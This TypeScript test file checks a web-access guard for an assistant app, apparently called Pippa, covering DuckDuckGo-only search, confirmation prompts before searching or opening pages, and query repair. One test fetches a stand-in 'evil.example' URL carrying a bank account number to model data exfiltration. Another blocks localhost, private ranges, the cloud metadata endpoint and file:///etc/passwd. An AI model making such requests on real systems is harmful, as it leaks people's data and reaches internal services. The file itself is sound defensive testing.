// Pippa's web access (index.ts) without network: the settings and the input repair directly, and the real Pi (pinned
// dev dependency, same version as app/Packaging/pi-release) loading index.ts in RPC mode with a fake HOME.
//
//   cd runtime/pippa-web && npm ci --ignore-scripts && npm test
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

const { DECLARATIONS, SETTINGS, WEB_DECLINED_REASON, WEB_NO_ONE_TO_ASK_REASON, addressesIn, leanDeclarations, localAddress, repairQueries, webAskText, webGuard, writeSettings } = await import("../index.ts");
const here = fileURLToPath(new URL(".", import.meta.url));
const extension = join(here, "..", "index.ts");

test("search goes only to DuckDuckGo, as the privacy policy says; never OpenAI, even with a ChatGPT sign-in", () => {
	assert.deepEqual(SETTINGS.searchRouting.providers, ["duckduckgo"]);
	assert.deepEqual(SETTINGS.webSearch.allowedProviders, ["duckduckgo"]);
	assert.deepEqual(SETTINGS.openaiSearchProviders, []);
	assert.equal(SETTINGS.fetchRouting.allowRemoteHostedProviders, false);
	assert.equal(SETTINGS.allowBrowserCookies, false);
});

test("settings are written to Pippa's folder, private to the person", () => {
	const dir = mkdtempSync(join(tmpdir(), "pippa-web-"));
	const { configDirectory } = writeSettings({ PIPPA_WEB_DIR: dir });
	const file = join(configDirectory, "web-search.json");
	assert.equal(configDirectory, join(dir, "pi"));
	assert.deepEqual(JSON.parse(readFileSync(file, "utf8")), SETTINGS);
	assert.equal(statSync(file).mode & 0o777, 0o600);
});

test("a broken queries string from a small model is repaired or blocked (pi-web-access #542)", () => {
	assert.deepEqual(repairQueries({ queries: '["a b", "c d"]' }), { input: { queries: ["a b", "c d"] } });
	assert.deepEqual(repairQueries({ queries: '["Brenner Tunnel", "Eröffnung 2026 Kritik]' }).input.queries, ["Brenner Tunnel", "Eröffnung 2026 Kritik"]);
	assert.deepEqual(repairQueries({ queries: "Wetter Berlin" }).input.queries, ["Wetter Berlin"]);
	assert.ok("reason" in repairQueries({ queries: '["a", 3' }));
	assert.ok("reason" in repairQueries({ queries: "[]" }));
	const input = { query: "x" };
	assert.equal(repairQueries(input).input, input, "well-formed input stays as it is");
});

test("the model sees short web declarations; other tools, other payloads and a second pass stay as they are", () => {
	const long = { type: "object", properties: { query: { type: "string", description: "long" }, proxy: { type: "string" } } };
	const other = { type: "function", function: { name: "read", description: "r", parameters: { type: "object", properties: {} } } };
	const payload = { model: "m", tools: [{ type: "function", function: { name: "web_search", description: "long", parameters: long } }, other] };
	const out = leanDeclarations(payload);
	assert.equal(out.tools[0].function.description, DECLARATIONS.web_search.description);
	assert.deepEqual(Object.keys(out.tools[0].function.parameters.properties), ["query", "queries", "recencyFilter"]);
	assert.equal(out.tools[1], other, "other tools unchanged");
	assert.equal(payload.tools[0].function.parameters, long, "input not mutated");
	assert.equal(leanDeclarations(out), undefined, "already short: nothing to change");
	const responses = leanDeclarations({ tools: [{ type: "function", name: "fetch_content", description: "long", parameters: long }] });
	assert.equal(responses.tools[0].parameters, DECLARATIONS.fetch_content.parameters);
	const anthropic = leanDeclarations({ tools: [{ name: "fetch_content", description: "long", input_schema: long }] });
	assert.equal(anthropic.tools[0].input_schema, DECLARATIONS.fetch_content.parameters);
	assert.equal(leanDeclarations({ messages: [] }), undefined);
});

/** A UI that answers every question with `answer` and remembers what it was asked. */
function ui(answer) {
	const asked = [];
	return { asked, ctx: { hasUI: true, ui: { confirm: async (title, message) => { asked.push({ title, message }); return answer; } } } };
}

test("the first search of an answer asks with the exact search text; later ones in the same answer run", async () => {
	const guard = webGuard();
	guard.agentStart();
	const { asked, ctx } = ui(true);
	assert.equal(await guard.toolCall({ toolName: "web_search", input: { queries: ["Wetter Köln morgen", "Regenradar Köln"] } }, ctx), undefined);
	assert.equal(asked.length, 1);
	assert.match(asked[0].message, /Wetter Köln morgen/);
	assert.match(asked[0].message, /Regenradar Köln/);
	assert.equal(await guard.toolCall({ toolName: "web_search", input: { query: "Wetter Bonn" } }, ctx), undefined);
	assert.equal(asked.length, 1, "allowed once per answer");
	guard.agentEnd();
	guard.agentStart();
	await guard.toolCall({ toolName: "web_search", input: { query: "Wetter Bonn" } }, ctx);
	assert.equal(asked.length, 2, "a new answer asks again");
});

test("a declined search, or no one to ask, sends nothing", async () => {
	const guard = webGuard();
	guard.agentStart();
	assert.deepEqual(await guard.toolCall({ toolName: "web_search", input: { query: "x" } }, ui(false).ctx), { block: true, reason: WEB_DECLINED_REASON });
	assert.deepEqual(await guard.toolCall({ toolName: "web_search", input: { query: "x" } }, {}), { block: true, reason: WEB_NO_ONE_TO_ASK_REASON });
});

test("pages from the person's message or this answer's search results are read without asking; others are asked for", async () => {
	const guard = webGuard();
	guard.input({ text: "Was steht auf https://www.verbraucherzentrale.de/kuendigung?" });
	guard.agentStart();
	const { asked, ctx } = ui(true);
	assert.equal(await guard.toolCall({ toolName: "fetch_content", input: { url: "https://www.verbraucherzentrale.de/kuendigung" } }, ctx), undefined);
	await guard.toolCall({ toolName: "web_search", input: { query: "Kündigung Fitnessstudio" } }, ctx);
	guard.toolResult({ toolName: "web_search", content: [{ type: "text", text: "1. Ratgeber\n   https://example.org/ratgeber/kuendigen.\n" }] });
	assert.equal(await guard.toolCall({ toolName: "fetch_content", input: { urls: ["https://example.org/ratgeber/kuendigen"] } }, ctx), undefined);
	assert.equal(asked.length, 1, "only the search was asked");
	assert.equal(await guard.toolCall({ toolName: "fetch_content", input: { url: "https://evil.example/c?iban=DE89370400440532013000" } }, ctx), undefined);
	assert.equal(asked.length, 2);
	assert.match(asked[1].message, /evil\.example/);
	const no = ui(false);
	assert.deepEqual(await guard.toolCall({ toolName: "fetch_content", input: { url: "https://evil.example/other" } }, no.ctx), { block: true, reason: WEB_DECLINED_REASON });
});

test("this Mac and its local network are never read, whatever the model says", async () => {
	for (const url of ["http://localhost:8080/", "http://127.0.0.1:41234/mcp", "http://192.168.1.1/", "http://10.0.0.2", "http://172.20.0.1",
		"http://169.254.169.254/latest", "http://[::1]/", "http://drucker.local/", "file:///etc/passwd", "ftp://example.org/x"]) {
		assert.ok(localAddress(url), url);
		const guard = webGuard();
		guard.input({ text: url });
		guard.agentStart();
		const result = await guard.toolCall({ toolName: "fetch_content", input: { url } }, ui(true).ctx);
		assert.equal(result?.block, true, url);
	}
	for (const url of ["https://www.tagesschau.de/", "https://172.32.0.1/", "https://example.org/a"]) assert.equal(localAddress(url), undefined, url);
});

test("addresses are taken from text without trailing punctuation; questions are in the app's language", () => {
	assert.deepEqual(addressesIn("Siehe https://a.example/x. Und (https://b.example/y)!"), ["https://a.example/x", "https://b.example/y"]);
	assert.equal(webAskText("search", ["a"], "de").title, "Darf Pippa im Internet suchen?");
	assert.equal(webAskText("page", ["https://a.example/x"], "en").title, "May Pippa open this web page?");
});

/** Starts the real Pi with index.ts and a probe extension that reports what Pi sees at session start. */
async function realPi() {
	const home = mkdtempSync(join(tmpdir(), "pippa-web-home-"));
	const probe = join(home, "probe.ts");
	const out = join(home, "probe.json");
	writeFileSync(probe, `import { writeFileSync } from "node:fs";
export default function (pi: any) {
	pi.on("session_start", () => writeFileSync(${JSON.stringify(out)}, JSON.stringify({
		tools: pi.getAllTools().map((tool: any) => tool.name),
		schemas: Object.fromEntries(pi.getAllTools().map((tool: any) => [tool.name, tool.parameters])),
		xdg: process.env.XDG_CONFIG_HOME ?? null,
	})));
	pi.on("tool_call", () => {});
}
`);
	const cli = join(here, "..", "node_modules", "@earendil-works", "pi-coding-agent", "dist", "cli.js");
	const env = { ...process.env, HOME: home, PIPPA_WEB_DIR: join(home, "pippa-web"), PI_OFFLINE: "1", PI_TELEMETRY: "0", PI_SKIP_VERSION_CHECK: "1" };
	delete env.PI_CODING_AGENT_DIR;
	delete env.XDG_CONFIG_HOME;
	const child = spawn(process.execPath, [cli, "--mode", "rpc", "--no-session", "--extension", extension, "--extension", probe], { env, cwd: home });
	let stderr = "";
	child.stderr.on("data", (chunk) => (stderr += chunk));
	const answered = new Promise((resolve) => child.stdout.on("data", (chunk) => String(chunk).includes('"get_state"') && resolve()));
	child.stdin.write(JSON.stringify({ type: "get_state", id: "1" }) + "\n");
	let timer;
	const late = new Promise((_, reject) => (timer = setTimeout(() => reject(new Error("Pi did not answer: " + stderr)), 30_000)));
	try {
		await Promise.race([answered, late]);
	} finally {
		clearTimeout(timer);
		child.kill();
	}
	return { home, probe: JSON.parse(readFileSync(out, "utf8")) };
}

test("the real Pi loads it: only search and read page; settings outside ~/.pi; environment put back", async () => {
	const { home, probe } = await realPi();
	const web = probe.tools.filter((name) => ["web_search", "fetch_content", "get_search_content", "source_check", "web_enable"].includes(name));
	assert.deepEqual(web.sort(), ["fetch_content", "web_search"]);
	assert.equal(probe.xdg, null, "bash commands must not inherit Pippa's config folder");
	assert.ok(existsSync(join(home, "pippa-web", "pi", "web-search.json")));
	assert.ok(!existsSync(join(home, ".pi", "agent", "web-search.json")), "the person's Pi settings stay untouched");
});

test("every short declaration is a part of what pi-web-access really accepts", async () => {
	const { probe } = await realPi();
	for (const [name, lean] of Object.entries(DECLARATIONS)) {
		const real = probe.schemas[name];
		assert.ok(real, `${name} is registered`);
		for (const [key, property] of Object.entries(lean.parameters.properties)) {
			const accepted = real.properties[key];
			assert.ok(accepted, `${name}.${key} exists in pi-web-access`);
			const types = [accepted, ...(accepted.anyOf ?? [])].map((x) => x.type);
			assert.ok(types.includes(property.type), `${name}.${key}: ${property.type}`);
			for (const value of property.enum ?? []) assert.ok(accepted.enum.includes(value), `${name}.${key}: ${value}`);
		}
		assert.deepEqual(lean.parameters.required ?? [], real.required ?? [], `${name}: same required parameters`);
	}
});
